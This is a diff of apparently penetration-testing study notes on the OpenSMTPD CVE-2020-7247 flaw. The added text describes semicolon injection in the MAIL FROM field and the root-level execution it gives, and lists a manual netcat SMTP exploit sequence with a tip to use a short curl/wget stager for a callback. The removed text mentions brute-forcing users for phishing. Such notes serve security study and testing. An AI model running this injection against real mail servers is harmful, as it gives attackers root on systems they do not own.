@@ -1,37 +1,23 @@
-## OpenSMTPD RCE (CVE-2020-7247)
+# OpenSMTPD CVE-2020-7247 — Unauthenticated RCE
 
-OpenSMTPD <= 6.6.2 banner detected on port 25; requires no authentication for unauthenticated command execution.
+OpenSMTPD ≤ 6.6.2. No auth required. Exploitable since 2018, disclosed 2020. Semicolon injection in the sender field of the `MAIL FROM` command breaks out of the recording function and executes arbitrary shell commands. 64-character limit on the injected command.
 
-Manual interaction to trigger shell command execution via sender field injection
+Runs as root (listening on port 25 requires root → service inherits those privs) → shell executes as root.
 
-```
-nc -nv <TARGET_IP> 25
-# Connect and compose email
-# In the sender field, use: ;<COMMAND>
-```
+Attack flow: establish SMTP connection → compose email with malicious `MAIL FROM` field → `MAIL FROM: <;cmd;@domain.com>` → semicolon interrupts parsing → command executes with elevated privs → callback to your host.
 
-> ⚠️ Gap: Source lacks specific SMTP protocol verbs (e.g., HELO, MAIL FROM, RCPT TO) required to reach the sender field during manual interaction.
+Exploit is on Exploit-DB. Interact manually or automate:
 
-- Service running with **root privileges** to bind to port 25 allows the injected command to execute with elevated permissions.
-    
-- Command length is strictly limited to **64 characters**.
-    
-- **Exceeding 64 characters** will result in the command failing to execute.
-    
-
-## Inbox Enumeration and Brute Forcing
-
-Authentication services like OWA, IMAP, or SMTP are exposed; requires brute-forcing credentials or direct IMAP interaction.
-
-Manual IMAP interaction for inbox enumeration
-
-```
-nc -nv <TARGET_IP> <PORT>
+```bash
+# manual SMTP interaction to test
+nc <TARGET> 25
+EHLO test
+MAIL FROM: <;cmd;@test.com>
+RCPT TO: <user@target.com>
+DATA
+.
 ```
 
-- SMTP → Use for brute-forcing users to facilitate phishing.
-- IMAP client → Use for enumerating a user's inbox once access is gained.
+> [!warning] 64-character command limit. Use a short stager (curl/wget a script, then execute) rather than trying to fit a full reverse shell inline.
 
-> ⚠️ Gap: Source identifies brute-forcing and IMAP enumeration as techniques but provides no specific command syntax or flags for tools.
-
-- **Invalid credentials** will prevent access to the IMAP client or inbox enumeration.
+> [!tip] Verify OpenSMTPD version before attempting — `banner grab` from Nmap or `nc <TARGET> 25` shows the version. Shodan confirms this service is common on Debian/Fedora/FreeBSD infrastructure.
